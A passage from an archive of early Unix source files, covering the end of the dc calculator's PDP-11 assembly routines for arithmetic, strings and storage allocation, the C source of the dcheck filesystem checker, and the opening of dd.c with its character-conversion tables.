/
2:
	mov	(sp)+,divcarry
	mov	0(sp),r1	/result
	jsr	pc,backspace
	mov	trial,r0
	jsr	pc,alterchar
	jsr	pc,backspace
/
/	and go for another digit
/
	dec	divoffset
	bmi	1f
	mov	dividend,r1
	dec	w(r1)
	cmp	w(r1),a(r1)
	bhis 9f; 4; 9:
	jmp	1b
/
/	fix up the result
/
1:
	tst	divcarry
	beq	1f
	mov	trial,r0
	dec	r0
	jsr	pc,alterchar
	mov	dividend,r1
	mov	$-1,r0
	jsr	pc,alterchar
	mov	divisor,r2
	mov	dividend,r3
	jsr	pc,add3
	mov	r1,-(sp)
	mov	r3,r1
	jsr	pc,release
	mov	(sp)+,dividend
1:
	mov	0(sp),r1	/result
	jsr	pc,rewind
	clr	divcarry
1:
	jsr	pc,lookchar
	bes	1f
	bic	$!377,r0
	add	divcarry,r0
	clr	divcarry
	cmp	r0,$100.
	blt	2f
	sub	$100.,r0
	inc	divcarry
2:	jsr	pc,alterchar
	br	1b
/
1:
	tst	divcarry
	beq	1f
	mov	$1.,r0
	jsr	pc,alterchar
1:
	jsr	pc,fsfile
1:
	jsr	pc,backspace
	bes	1f
	bne	1f
	mov	r(r1),w(r1)
	br	1b
1:
/
/	change sign of result if necessary
/
	tst	divsign
	bpl	1f
	jsr	pc,chsign
1:
	mov	dividend,r1
	jsr	pc,fsfile
1:
	jsr	pc,backspace
	bes	1f
	bne	1f
	mov	r(r1),w(r1)
	br	1b
1:
bugout:
	tst	remsign
	bpl	1f
	mov	dividend,r1
	jsr	pc,chsign
/
/	clean up junk, restore registers, and return
/
1:
	mov	divisor,r1
	jsr	pc,release
	mov	(sp)+,r1
	mov	(sp)+,r0
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	dividend,r4
	mov	(sp)+,r5
	clc
	rts	pc
/
/
/
/
.bss
divisor: .=.+2
dividend: .=.+2
divxyz:	.=.+2
divoffset:.=.+2
divcarry: .=.+2
divsign: .=.+2
trial:	.=.+2
remsign: .=.+2
magic:	.=.+2
.text
/
/
/
/	routine to exponentiate the two centennial numbers
/	pointed to by r2 (the base) and r3 (the exponent).
/	A pointer to the result is returned in r1.
/
/	mov	base,r2
/	mov	exp,r3
/	jsr	pc,exp3
/	mov	r1,...
/
/
/	save registers
/
exp3:
	mov	r3,-(sp)	/exponent
	mov	r2,-(sp)	/base
	mov	r0,-(sp)
/
/
1:
	mov	$1,r0
	jsr	pc,allocate
	mov	r1,-(sp)	/accumulated result
	mov	$1,r0
	jsr	pc,putchar
/
	mov	r2,r1
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,-(sp)	/powers of the base
	mov	r2,r0
	jsr	pc,move
/
	mov	r3,r1
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,-(sp)	/exponent
	mov	r3,r0
	jsr	pc,move
	jsr	pc,fsfile
	clr	exptemp
	jsr	pc,backspace
	bpl	1f
	inc	exptemp
	jsr	pc,chsign
/
1:
	mov	0(sp),r1
	jsr	pc,length
	beq	1f
	mov	sqtemp,r2
	mov	0(sp),r3
	jsr	pc,div3
	mov	r1,0(sp)
	mov	r3,r1
	jsr	pc,release
	mov	r4,r1
	jsr	pc,length
	jsr	pc,release
	tst	r0
	beq	2f
/
/
/
	mov	2(sp),r2
	mov	4(sp),r3
	jsr	pc,mul3
	mov	r1,4(sp)
	mov	r3,r1
	jsr	pc,release
2:
	mov	2(sp),r3
	mov	r3,r1
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,r2
	mov	r3,r0
	jsr	pc,move
	jsr	pc,mul3
	mov	r1,2(sp)
	mov	r3,r1
	jsr	pc,release
	mov	r2,r1
	jsr	pc,release
	br	1b
1:
	tst	exptemp
	beq	1f
	mov	10(sp),r1
	jsr	pc,length
	bne	2f
	jmp	eh
2:
	cmp	r0,$1
	blos	2f
	mov	4(sp),r1
	jsr	pc,create
	br	1f
2:
	jsr	pc,rewind
	jsr	pc,getchar
	cmp	r0,$1
	bgt	2f
	mov	4(sp),r1
	jsr	pc,create
	jsr	pc,putchar
	br	1f
2:
	mov	4(sp),r1
	jsr	pc,create
1:
	mov	(sp)+,r1
	jsr	pc,release
	mov	(sp)+,r1
	jsr	pc,release
	mov	(sp)+,r1
/
	mov	(sp)+,r0
	mov	(sp)+,r2
	mov	(sp)+,r3
	rts	pc
/
.bss
exptemp: .=.+2
.text
/
-- /usr/source/s1/dc4.s mode=0110664 uid=3 gid=3 atime=174922745 mtime=169260571 --
.globl	getchar
.globl	stats
.globl	lookchar
.globl	fsfile
.globl	seekchar
.globl	backspace
.globl	putchar
.globl	alterchar
.globl	move
.globl	rewind
.globl	create
.globl	zero
.globl	allocate
.globl	release
.globl	collect
.globl	getword, putword
.globl	length, position
.globl	w, r, a, l
/
testing = 0
/
/
/	routine to return the length of a string
/
/	mov	...,r1
/	jsr	pc,length
/	mov	r0,...
/
length:
	mov	w(r1),r0
	sub	a(r1),r0
	rts	pc
/
/
/	routine to return the read pointer position
/
/	mov	...,r1
/	jsr	pc,position
/	mov	r0,...
/
position:
	mov	r(r1),r0
	sub	a(r1),r0
	rts	pc
/
/
/
/
/	routine to get a word from the string
/	mov	...,r1
/	jsr	pc,getword
/	mov	r0,...
/
getword:
	jsr	pc,getchar
	bes	noch
	movb	r0,nchar
	jsr	pc,getchar
	bec	2f
	dec	r(r1)
	br	noch
2:	movb	r0,nchar+1
	mov	nchar,r0
	tst	r0		/tst clears c-bit
	rts	pc
/
/
/	routine to put a word onto the string
/	mov	...,r1
/	mov	...,r0
/	jsr	pc,putword
/
putword:
	jsr	pc,putchar
	swab	r0
	jsr	pc,putchar
	swab	r0
	rts	pc
/
.bss
nchar:	.=.+2
.text
/
/
/
/	routine to read next character from string
/	pointed to by r1;  character returned in r0
/	c-bit set if character not available (end of file)
/	r1 is preserved
/
/	mov	...,r1
/	jsr	pc,getchar
/	movb	r0,...
/
getchar:
	jsr	pc,lookchar
	bec	2f
	rts	pc
2:	inc	r(r1)
	tst	r0		/tst clears c-bit
	rts	pc
/
noch:	clr	r0
	sec
	rts	pc
/
/	routine to look at next character from string
/	pointed to by r1;  character returned in r0
/	c-bit set if character not available (end of file)
/	r1 is preserved
/
/	mov	...,r1
/	jsr	pc,lookchar
/	movb	r0,...
/
lookchar:
	.if	testing
	jsr	pc,plausible
	inc	stats+6.
	.endif
	cmp	w(r1),r(r1)
	blos	noch
	movb	*r(r1),r0
	clc
	rts	pc
/
plausible:
	cmp	r1,$headers
	bhis 9f; 4; 9:
	cmp	r1,$headend
	blo 9f; 4; 9:
	rts	pc
/
/
/
/	routine to move the read pointer of a string to a
/	specified point.  If the string is not long enough,
/	the string is extended
/
/	mov	position,r0
/	mov	...,r1
/	jsr	pc,seekchar
/
seekchar:
	mov	r1,-(sp)
	mov	r0,-(sp)
	.if	testing
	jsr	pc,plausible
	inc	stats+10.
	.endif
1:
	mov	(sp),r0
	add	a(r1),r0
	cmp	r0,l(r1)
	bhi	3f
	mov	r0,r(r1)
	cmp	r0,w(r1)
	blo	1f
	mov	r0,w(r1)
	br	1f
3:
	mov	(sp),r0
	jsr	pc,allocate
	mov	2(sp),r0
	jsr	pc,move
	jsr	pc,swap
	jsr	pc,release
	mov	2(sp),r1
	br	1b
1:
	mov	(sp)+,r0
	mov	(sp)+,r1
	rts	pc
/
/
/	routine to move read pointer of string to end of string
/
/	mov	...,r1
/	jsr	pc,fsfile
/
fsfile:
	.if	testing
	jsr	pc,plausible
	inc	stats+10.
	.endif
	mov	w(r1),r(r1)
	rts	pc
/
/
/	routine to read a string backwards
/	the read pointer is decremented before reading
/
/	mov	...,r1
/	jsr	pc,backspace
/	mov	r0,...
/
backspace:
	.if	testing
	jsr	pc,plausible
	inc	stats+6.
	.endif
	cmp	a(r1),r(r1)
	bhis	noch
	dec	r(r1)
	movb	*r(r1),r0
	clc
	rts	pc
/
/
/
/
/	routine to put a character into the string
/	pointed to by r1;  character in r0
/	r0 and r1 are preserved.
/
/	movb	ch,r0
/	mov	...,r1
/	jsr	pc,putchar
/
putchar:
	mov	r1,-(sp)
	mov	r0,-(sp)
	.if	testing
	jsr	pc,plausible
	inc	stats+8.
	.endif
1:	cmp	w(r1),l(r1)
	blt	3f
	mov	w(r1),r0
	inc	r0
	sub	a(r1),r0	/W-A+1
	jsr	pc,allocate
	mov	2(sp),r0	/r1
	jsr	pc,move
	jsr	pc,swap
	jsr	pc,release
	mov	2(sp),r1	/r1
	cmp	w(r1),l(r1)
	blt	3f
	jmp	err
/
3:	movb	(sp),*w(r1)
	inc	w(r1)
	mov	(sp)+,r0
	tst	(sp)+
	rts	pc
/
/
swap:
	mov	w(r1),-(sp)
	mov	w(r0),w(r1)
	mov	(sp),w(r0)
	mov	r(r1),(sp)
	mov	r(r0),r(r1)
	mov	(sp),r(r0)
	mov	a(r1),(sp)
	mov	a(r0),a(r1)
	mov	(sp),a(r0)
	mov	l(r1),(sp)
	mov	l(r0),l(r1)
	mov	(sp)+,l(r0)
	rts	pc
/
/
/	routine to alter a character in the string
/	pointed to by r1;  character in r0
/	r0 and r1 are preserved.
/
/	movb	ch,r0
/	mov	...,r1
/	jsr	pc,alterchar
/
alterchar:
	mov	r1,-(sp)
	mov	r0,-(sp)
	.if	testing
	jsr	pc,preposterous
	inc	stats+8.
	.endif
1:	cmp	r(r1),l(r1)
	blt	3f
	mov	l(r1),r0
	inc	r0
	sub	a(r1),r0	/W-A+1
	jsr	pc,allocate
	mov	2(sp),r0	/r1
	jsr	pc,move
	jsr	pc,swap
	jsr	pc,release
	mov	2(sp),r1	/r1
	cmp	r(r1),l(r1)
	blt	3f
	jmp	err
/
3:	movb	(sp),*r(r1)
	inc	r(r1)
	cmp	r(r1),w(r1)
	ble	1f
	mov	r(r1),w(r1)
1:
	mov	(sp)+,r0
	tst	(sp)+
	rts	pc
/
/
/	routine to move the contents of one string
/	to another.
/
/	mov	source,r0
/	mov	dest,r1
/	jsr	pc,move
/
/	on return, r1 points to the new string and should
/	be saved.  r0 is preserved.
/
move:
	mov	r3,-(sp)
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,-(sp)
	mov	w(r0),r2
	sub	a(r0),r2	/W-A
	mov	l(r1),r3
	sub	a(r1),r3	/L-A
	cmp	r2,r3
	ble	1f
	mov	r2,r0
	jsr	pc,allocate
	mov	2(sp),r0	/r1
	jsr	pc,swap
	jsr	pc,release
	mov	r0,r1
	mov	0(sp),r0	/r0
/
1:	mov	a(r0),(r0)
	mov	a(r1),(r1)
1:	dec	r2
	blt	1f
	movb	*(r0),*(r1)
	inc	(r0)
	inc	(r1)
	br	1b
/
/	fix up read ptr of new string
/
1:	mov	r(r0),r2
	sub	a(r0),r2
	add	a(r1),r2
	mov	r2,r(r1)
/
/	restore and return
/
	mov	(sp)+,r0
	mov	(sp)+,r1
	mov	(sp)+,r2
	mov	(sp)+,r3
	rts	pc
/
/
/	routine to rewind read pointer of string
/	pointed to by r1
/
/	mov	...,r1
/	jsr	pc,rewind
/
rewind:
	.if	testing
	jsr	pc,plausible
	inc	stats+10.
	.endif
	mov	a(r1),r(r1)
	rts	pc
/
/	routine to rewind write pointer of string
/	pointed to by r1
/
/	mov	...,r1
/	jsr	pc,create
/
create:
	.if	testing
	jsr	pc,plausible
	inc	stats+10.
	.endif
	mov	a(r1),w(r1)
	mov	a(r1),r(r1)
	rts	pc
/
/
/	routine to zero a string
/
/	mov	...,r1
/	jsr	pc,zero
/
zero:
	mov	r0,-(sp)
	.if	testing
	jsr	pc,preposterous
	.endif
	mov	a(r1),r0
1:	cmp	r0,l(r1)
	bhis	1f
	clrb	(r0)+
	br	1b
1:	mov	(sp)+,r0
	rts	pc
/
/
-- /usr/source/s1/dc5.s mode=0110664 uid=3 gid=3 atime=174922745 mtime=169260571 --
/
/
/	here to allocate a new block
/
/	mov	...,r0
/	jsr	pc,allocate
/	mov	r1,...
/
/	requested size in bytes in r0
/	pointer to header of allocated block returned in r1
/	r0 is preserved
/
/	convert to words, adjust for header, round up
/	to a power of two
/
/	each block has a four-word header
/		W - write ptr (also used as link ptr in frlist)
/		R - read ptr
/		A - pointer to head of data
/		L - ptr to (end+1) of data
w=0
r=2
a=4
l=6
/
allocate:
	clr	garbage
	mov	r0,-(sp)
	mov	r2,-(sp)
	tst	stats
	bne	1f
	jsr	pc,init
1:
	inc	stats
	bne 9f; inc stats; 9:
	cmp	r0,$strend-strbuf
	blos 9f; 4; 9:
1:
	cmp	$8.,r0
	blo	2f
	mov	$3.,r0
	br	1f
2:
	sub	$1,r0
	bmi	1f
	jsr	pc,log2
	add	$1,r0
1:	asl	r0		/bite to word
	mov	r0,-(sp)
	add	$2,r0
	cmp	r0,$frend-frlist+2
	blo	zzz
	jmp	err
/
/	look on free list for block of required size
/
zzz:
	mov	(sp),r0
	tst	frlist(r0)
	beq	xxx
/
/	found it, allocate and return
/
	mov	frlist(r0),r1
	mov	(r1),frlist(r0)
	mov	a(r1),r0
	mov	r0,w(r1)		/W
	mov	r0,r(r1)		/R
	tst	(sp)+
	mov	(sp)+,r2
	mov	(sp)+,r0
	rts	pc
/
/	no block of required size
/	look for larger block
/
xxx:
	tst	hdrptr
	bne	1f
	mov	r0,-(sp)
	jsr	pc,morehd
	tst	r0
	bne	out
	mov	(sp)+,r0
1:
	tst	(r0)+
	cmp	r0,$frend-frlist
	bhis	www
	tst	frlist(r0)
	bne	yyy
	br	xxx
/
/	there are no larger blocks;  must garbage collect
/
www:
	jsr	pc,collect
	tst	r0
	bne	zzz
	jsr	pc,moresp
	tst	r0
	beq	zzz
/
/	out of space
/
out:
	mov	$1,r0
	sys	write; 1f; 2f-1f
	jmp	reset
1:	<Out of space.\n>
2:	.even
/
/	split larger block into two smaller pieces and
/	link together as smaller blocks in the free list.
/
yyy:
	mov	frlist(r0),r1
	mov	(r1),frlist(r0)
	mov	hdrptr,r2
	bne	1f
	mov	r0,-(sp)
	jsr	pc,morehd
	tst	r0
	bne	out
	mov	(sp)+,r0
	mov	hdrptr,r2
1:
	mov	(r2),hdrptr
	clr	(r2)
	mov	r2,(r1)
	mov	r1,hdrptr(r0)
	mov	l(r1),l(r2)
	mov	l(r1),r0
	sub	a(r1),r0
	asr	r0
	add	a(r1),r0
	mov	r0,l(r1)
	mov	r0,a(r2)
	br	zzz
/
/
/	here to release a block
/
/	mov	...,r1
/	jsr	pc,release
/
/	pointer to block in r1
/
release:
/
/	discover that this is a plausible pointer
/
	mov	r0,-(sp)
	jsr	pc,preposterous
/
/	find free list index and link block to that entry
/
	inc	stats+2
	mov	frlist(r0),(r1)
	clr	r(r1)
	mov	r1,frlist(r0)
	clr	r1		/self-defense
	mov	(sp)+,r0
	rts	pc
/
/
/	jsr	pc,collect
/
/	coalesce free storage by rejoining paired blocks
/	on the free list.
/	zero is returned in r0 if no paired blocks were found.
/
collect:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r4,-(sp)
	clr	useful
	inc	stats+4.
	clr	r0		/start with smallest blocks
				/r0 contains frlist index
loop1:	mov	$frlist,r1
	add	r0,r1
/
/	try next list member at this level
/
loop2:	mov	(r1),r3
	beq	advance		/list is empty
	tst	*(r1)		/W
	beq	advance		/only one list element
/
/	calculate address of buddy
/
	mov	a(r3),r4
	mov	$block,r2
1:
	cmp	r4,(r2)
	blo	1f
	cmp	r2,lblock
	beq	2f
	add	$2,r2
	br	1b
1:
	sub	$2,r2
2:
	mov	(r2),beg
	sub	beg,r4
	bit	exp2(r0),r4
	beq	2f
	bic	exp2(r0),r4
	br	1f
2:	bis	exp2(r0),r4
1:	add	beg,r4
/
/	and search for him
/
loop3:	tst	0(r3)
	beq	nocoal
	mov	(r3),r2
	cmp	a(r2),r4
	beq	coal
	mov	(r3),r3
	br	loop3
/
/	have found a pair; remove both blocks from list,
/	coalesce them, and put them on next higher list
/
coal:	inc	useful
	mov	(r3),r4
	mov	(r4),(r3)	/remove him from list
	mov	(r1),r2
	mov	(r2),(r1)	/remove the other one
	cmp	a(r2),a(r4)
	bgt	1f
	mov	r2,-(sp)
	mov	r4,r2
	mov	(sp)+,r4
1:	add	exp2(r0),l(r4)
	clr	r(r4)
	mov	frlist+2(r0),(r4)
	mov	r4,frlist+2(r0)
	mov	hdrptr,(r2)
	mov	r2,hdrptr
	clr	r(r2)
	mov	beg,a(r2)
	mov	beg,l(r2)
	br	loop2
/
/	no buddy found, try next block on this list
/
nocoal:
	mov	(r1),r1
	br	loop2
/
/	advance to next free list
/
advance:
	tst	(r0)+
	cmp	r0,$frend-frlist
	blo	loop1
	mov	useful,r0
/
/	do we have enough headers to continue?
/
	cmp	garbage,$2
	blo	1f
	mov	$1,r0
	sys	write; 4f; 5f-4f
	jmp	reset
/
4:	<Out of space - too big a block.\n>
5:	.even
/
/
/	restore registers and return
/
1:
	inc	garbage
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc
/
.bss
garbage: .=.+2
.text
/
/	routine to get more space for strings
/
moresp:
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	brk,r1
	mov	$block,r2
	add	nblock,r2
	cmp	r2,$blkend
	bhis	rout
	mov	r1,(r2)
	mov	r1,lblock
	add	$2,nblock
	add	$10000,r1
	mov	r1,9f
	sys	break;9:..
	bes	2f
	mov	hdrptr,r2
	bne	1f
	jsr	pc,morehd
	tst	r0
	beq	2f
	mov	hdrptr,r2
1:
	mov	(r2),hdrptr
	mov	brk,a(r2)
	mov	r1,brk
	mov	r1,l(r2)
	clr	r(r2)
	mov	$10000,r0
	jsr	pc,log2
	asl	r0
	mov	frlist(r0),w(r2)
	mov	r2,frlist(r0)
	clr	r0
	mov	(sp)+,r1
	mov	(sp)+,r2
	rts	pc
2:
	mov	$1,r0
	mov	(sp)+,r1
	mov	(sp)+,r2
	rts	pc
/
/	routine to get move space for headers
/
morehd:
	mov	r2,-(sp)
	mov	brk,r0
	mov	$hblock,r2
	add	nhdr,r2
	cmp	r2,$hblkend
	bhis	rout
	mov	r0,(r2)
	mov	r0,lhblock
	add	$2,nhdr
	add	$1024.,r0
	mov	r0,9f
	sys	break;9:..
	bes	2f
	mov	brk,r2
	mov	r2,hdrptr
	mov	r0,brk
	sub	$8,r0
1:
	add	$8,r2
	mov	r2,-8(r2)
	cmp	r2,r0
	blos	1b
	clr	-8(r2)
	clr	r0
	mov	(sp)+,r2
	rts	pc
2:
	mov	$1,r0
	mov	(sp)+,r2
	rts	pc
rout:
	mov	$1,r0
	sys	write; 4f; 5f-4f
	jmp	reset
/
4:	<out of space - no more block storage\n>
5:	.even
/
/	routine to find integer part of log2(x)
/
/	jsr	pc,log2
/
/	r0 = log2(r0)
/
log2:
	mov	r0,-(sp)
	bge 9f; 4; 9:
	mov	$15.,r0
1:
	rol	(sp)
	bmi	1f
	sob	r0,1b
1:
	dec	r0
	tst	(sp)+
	rts	pc
/
	0		/Don't move me, I'm exp(-1)
exp2:
	1;2;4;10;20;40;100;200;400;1000;2000;4000;
	10000;20000;40000;100000
/
/	routine to discover whether r1 points to
/	a plausible header - to avoid ruination.
/
/	r1 is preserved and r0 gets a suitable index for frlist
/
/	jsr	pc,preposterous
/
preposterous:
	mov	r2,-(sp)
	mov	$hblock,r2
1:
	cmp	r1,(r2)
	blo	1f
	cmp	(r2),lhblock
	beq	2f
	add	$2,r2
	br	1b
1:
	sub	$2,r2
2:
	mov	(r2),r2
	add	$1024.,r2
	cmp	r1,r2
	blo	9f;4;9:
	mov	$block,r2
1:
	cmp	a(r1),(r2)
	blo	1f
	cmp	(r2),lblock
	beq	2f
	add	$2,r2
	br	1b
1:
	sub	$2,r2
2:
	cmp	l(r1),(r2)
	bhis	9f;4;9:
	mov	(r2),r2
	add	$10000,r2
	cmp	a(r1),r2
	blo	9f;4;9:
	cmp	l(r1),r2
	blos	9f;4;9:
	mov	(sp)+,r2
	mov	l(r1),r0		/L
	sub	a(r1),r0		/A
	mov	r0,-(sp)
	jsr	pc,log2
	asl	r0
	cmp	exp2(r0),(sp)
	beq 9f; 4; 9:
	add	$2,r0
	cmp	r0,$frend-frlist+2
	blo 9f; 4; 9:
	sub	$2,r0
	mov	r0,(sp)
	mov	frlist(r0),r0
1:	beq	1f
	cmp	r0,r1
	bne 9f; 4; 9:
	mov	(r0),r0
	br	1b
1:	mov	(sp)+,r0
	rts	pc
/
/
/	routine to initialize storage area, headers and
/	free list upon first call to allocate a block.
/	The entire storage area is formed into a single block.
/
init:
	mov	r0,-(sp)
	mov	r1,-(sp)
/
/	form all the headers into a single list.
/
	mov	$headers,r0
	mov	r0,hdrptr
1:	add	$8,r0
	mov	r0,-8(r0)
	cmp	r0,$headend-8
	blos	1b
	clr	-8(r0)
	mov	$frlist,r0
1:	clr	(r0)+
	cmp	r0,$frend
	blo	1b
/
	mov	hdrptr,r1
	mov	(r1),hdrptr
	clr	w(r1)
	mov	$strbuf,r0
	mov	r0,a(r1)
	mov	$strend-strbuf,r0
	jsr	pc,log2
	asl	r0
	cmp	r0,$frend-frlist
	blo 9f; 4; 9:
	mov	r1,frlist(r0)
	mov	exp2(r0),r0
	add	$strbuf,r0
	mov	r0,l(r1)
	mov	$hdrptr,r1
1:	mov	(r1),r1
	tst	r1
	beq	1f
	mov	$strbuf,a(r1)
	mov	$strbuf,l(r1)
	br	1b
1:
	mov	$end,brk
	add	$2,nblock
	mov	$strbuf,block
	mov	$strbuf,lblock
	mov	$headers,hblock
	add	$2,nhdr
	mov	$headers,lhblock
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	pc
/
/
.bss
nhdr:	.=.+2
lhblock:	.=.+2
hblock:	.=.+20.
hblkend:
stats:	.=.+16.
useful:	.=.+2
beg:	.=.+2
lblock:	.=.+2
nblock:	.=.+2
block:	.=.+40.
blkend:
brk:	.=.+2
hdrptr:	.=.+2	/do not move me
frlist:	.=hdrptr+32.
frend:
headers:.=hdrptr+1024.
headend:
strbuf:	.=.+10000
strend:
end:
signal = 48.
-- /usr/source/s1/dcheck.c mode=0100664 uid=3 gid=3 atime=174922756 mtime=169260571 --
#

char	*dargv[]
{
	"/dev/rrk2",
	"/dev/rrp0",
	0
};

#define NINODE	16*16
#define	NI	20

#include "/usr/sys/ino.h"
#include "/usr/sys/filsys.h"

struct	inode	inode[NINODE];
struct	filsys	sblock;

int	sflg;
int	headpr;

int	ilist[NI] { -1};
int	fi;
char	*ecount;
char	*lasts;
int	ino;
int	nerror;
int	nfiles;
struct dir {
	int	ino;
	char	name[14];
};

main(argc, argv)
char **argv;
{
	register char **p;
	register int n, *lp;

	ecount = sbrk(0);
	if (argc == 1) {
		for (p = dargv; *p;)
			check(*p++);
		return(nerror);
	}
	while (--argc) {
		argv++;
		if (**argv=='-') switch ((*argv)[1]) {
		case 's':
			sflg++;
			continue;

		case 'i':
			lp = ilist;
			while (lp < &ilist[NI-1] && (n = number(argv[1]))) {
				*lp++ = n;
				argv++;
				argc--;
			}
			*lp++ = -1;
			continue;

		default:
			printf("Bad flag\n");
		}
		check(*argv);
	}
	return(nerror);
}

check(file)
char *file;
{
	register i, j;
	fi = open(file, 0);
	if(fi < 0) {
		printf("cannot open %s\n", file);
		return;
	}
	headpr = 0;
	printf("%s:\n", file);
	sync();
	bread(1, &sblock, 512);
	nfiles = sblock.s_isize*16;
	if (lasts < nfiles) {
		if ((sbrk(nfiles - lasts)) == -1) {
			printf("Not enough core\n");
			exit(04);
		}
		lasts = nfiles;
	}
	for (i=0; i<nfiles; i++)
		ecount[i] = 0;
	for(i=0; ino<nfiles; i =+ NINODE/16) {
		bread(i+2, inode, sizeof inode);
		for(j=0; j<NINODE && ino<nfiles; j++) {
			ino++;
			pass1(&inode[j]);
		}
	}
	ino = 0;
	for (i=0; ino<nfiles; i =+ NINODE/16) {
		bread(i+2, inode, sizeof inode);
		for (j=0; j<NINODE && ino<nfiles; j++) {
			ino++;
			pass2(&inode[j]);
		}
	}
}

pass1(aip)
struct inode *aip;
{
	register doff;
	register struct inode *ip;
	register struct dir *dp;
	int i;

	ip = aip;
	if((ip->i_mode&IALLOC) == 0)
		return;
	if((ip->i_mode&IFMT) != IFDIR)
		return;
	doff = 0;
	while (dp = dread(ip, doff)) {
		doff =+ 16;
		if (dp->ino==0)
			continue;
		for (i=0; ilist[i] != -1; i++)
			if (ilist[i]==dp->ino)
				printf("%5l arg; %l/%.14s\n", dp->ino, ino, dp->name);
		ecount[dp->ino]++;
	}
}

pass2(aip)
{
	register struct inode *ip;
	register i;

	ip = aip;
	i = ino;
	if ((ip->i_mode&IALLOC)==0 && ecount[i]==0)
		return;
	if (ip->i_nlink==ecount[i] && ip->i_nlink!=0)
		return;
	if (headpr==0) {
		printf("entries	link cnt\n");
		headpr++;
	}
	printf("%l	%d	%d\n", ino,
	    ecount[i]&0377, ip->i_nlink&0377);
}

dread(aip, aoff)
{
	register b, off;
	register struct inode *ip;
	static ibuf[256];
	static char buf[512];

	off = aoff;
	ip = aip;
	if ((off&0777)==0) {
		if (off==0177000) {
			printf("Monstrous directory %l\n", ino);
			return(0);
		}
		if ((ip->i_mode&ILARG)==0) {
			if (off>=010000 || (b = ip->i_addr[off>>9])==0)
				return(0);
			bread(b, buf, 512);
		} else {
			if (off==0) {
				if (ip->i_addr[0]==0)
					return(0);
				bread(ip->i_addr[0], ibuf, 512);
			}
			if ((b = ibuf[(off>>9)&0177])==0)
				return(0);
			bread(b, buf, 512);
		}
	}
	return(&buf[off&0777]);
}

bread(bno, buf, cnt)
{

	seek(fi, bno, 3);
	if(read(fi, buf, cnt) != cnt) {
		printf("read error %d\n", bno);
		exit();
	}
}

bwrite(bno, buf)
{

	seek(fi, bno, 3);
	if(write(fi, buf, 512) != 512) {
		printf("write error %d\n", bno);
		exit();
	}
}

number(as)
char *as;
{
	register n, c;
	register char *s;

	s = as;
	n = 0;
	while ((c = *s++) >= '0' && c <= '9') {
		n = n*10+c-'0';
	}
	return(n);
}
-- /usr/source/s1/dd.c mode=0110664 uid=3 gid=3 atime=174922773 mtime=169260571 --
#define	LCASE	01
#define	UCASE	02
#define	SWAB	04
#define NERR	010
#define SYNC	020
int	cflag;
int	fflag;
int	skip;
int	count;
char	*string;
char	*ifile;
char	*ofile;
char	*ibuf;
char	*obuf;
char	*ibs	512;
char	*obs	512;
char	*bs;
char	*cbs;
char	*ibc;
char	*obc;
char	*cbc;
int	nifr;
int	nipr;
int	nofr;
int	nopr;
int	ntrunc;
int	ibf;
int	obf;
char	*op;
int	nspace;
char	etoa[]
{
	0000,0001,0002,0003,0234,0011,0206,0177,
	0227,0215,0216,0013,0014,0015,0016,0017,
	0020,0021,0022,0023,0235,0205,0010,0207,
	0030,0031,0222,0217,0034,0035,0036,0037,
	0200,0201,0202,0203,0204,0012,0027,0033,
	0210,0211,0212,0213,0214,0005,0006,0007,
	0220,0221,0026,0223,0224,0225,0226,0004,
	0230,0231,0232,0233,0024,0025,0236,0032,
	0040,0240,0241,0242,0243,0244,0245,0246,
	0247,0250,0133,0056,0074,0050,0053,0041,
	0046,0251,0252,0253,0254,0255,0256,0257,
	0260,0261,0135,0044,0052,0051,0073,0136,
	0055,0057,0262,0263,0264,0265,0266,0267,
	0270,0271,0174,0054,0045,0137,0076,0077,
	0272,0273,0274,0275,0276,0277,0300,0301,
	0302,0140,0072,0043,0100,0047,0075,0042,
	0303,0141,0142,0143,0144,0145,0146,0147,
	0150,0151,0304,0305,0306,0307,0310,0311,
	0312,0152,0153,0154,0155,0156,0157,0160,
	0161,0162,0313,0314,0315,0316,0317,0320,
	0321,0176,0163,0164,0165,0166,0167,0170,
	0171,0172,0322,0323,0324,0325,0326,0327,
	0330,0331,0332,0333,0334,0335,0336,0337,
	0340,0341,0342,0343,0344,0345,0346,0347,
	0173,0101,0102,0103,0104,0105,0106,0107,
	0110,0111,0350,0351,0352,0353,0354,0355,
	0175,0112,0113,0114,0115,0116,0117,0120,
	0121,0122,0356,0357,0360,0361,0362,0363,
	0134,0237,0123,0124,0125,0126,0127,0130,
	0131,0132,0364,0365,0366,0367,0370,0371,
	0060,0061,0062,0063,0064,0065,0066,0067,
	0070,0071,0372,0373,0374,0375,0376,0377,
};
char	atoe[]
{
	0000,0001,0002,0003,0067,0055,0056,0057,
	0026,0005,0045,0013,0014,0015,0016,0017,
	0020,0021,0022,0023,0074,0075,0062,0046,
	0030,0031,0077,0047,0034,0035,0036,0037,
	0100,0117,0177,0173,0133,0154,0120,0175,
	0115,0135,0134,0116,0153,0140,0113,0141,
	0360,0361,0362,0363,0364,0365,0366,0367,
	0370,0371,0172,0136,0114,0176,0156,0157,
	0174,0301,0302,0303,0304,0305,0306,0307,
	0310,0311,0321,0322,0323,0324,0325,0326,
	0327,0330,0331,0342,0343,0344,0345,0346,
	0347,0350,0351,0112,0340,0132,0137,0155,
	0171,0201,0202,0203,0204,0205,0206,0207,
	0210,0211,0221,0222,0223,0224,0225,0226,
	0227,0230,0231,0242,0243,0244,0245,0246,
	0247,0250,0251,0300,0152,0320,0241,0007,
	0040,0041,0042,0043,0044,0025,0006,0027,
	0050,0051,0052,0053,0054,0011,0012,0033,
	0060,0061,0032,0063,0064,0065,0066,0010,
	0070,0071,0072,0073,0004,0024,0076,0341,
	0101,0102,0103,0104,0105,0106,0107,0110,
	0111,0121,0122,0123,0124,0125,0126,0127,
	0130,0131,0142,0143,0144,0145,0146,0147,
	0150,0151,0160,0161,0162,0163,0164,0165,
	0166,0167,0170,0200,0212,0213,0214,0215,
	0216,0217,0220,0232,0233,0234,0235,0236,
	0237,0240,0252,0253,0254,0255,0256,0257,
	0260,0261,0262,0263,0264,0265,0266,0267,
	0270,0271,0272,0273,0274,0275,0276,0277,
	0312,0313,0314,0315,0316,0317,0332,0333,
